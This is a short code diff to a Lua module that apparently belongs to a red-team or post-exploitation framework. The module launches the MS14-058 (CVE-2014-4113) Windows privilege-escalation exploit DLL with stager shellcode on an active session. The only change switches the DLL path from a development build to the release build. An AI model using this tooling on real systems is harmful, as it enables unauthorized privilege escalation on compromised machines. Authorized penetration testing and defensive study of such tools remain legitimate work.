@@ -11,7 +11,7 @@ local function run_ms14_058(args)
     local session = active()
     local shellcode = self_stager(session)
     local arch = session.Os.Arch
-    local dllpath = script_resource(elevate_dir .. "cve-2014-4113-dev" .. "." ..
+    local dllpath = script_resource(elevate_dir .. "cve-2014-4113" .. "." ..
                                         arch .. ".dll")
     print("running ms14-058")
     return dllspawn(session, dllpath, "", shellcode, "", false, 60, arch, "",
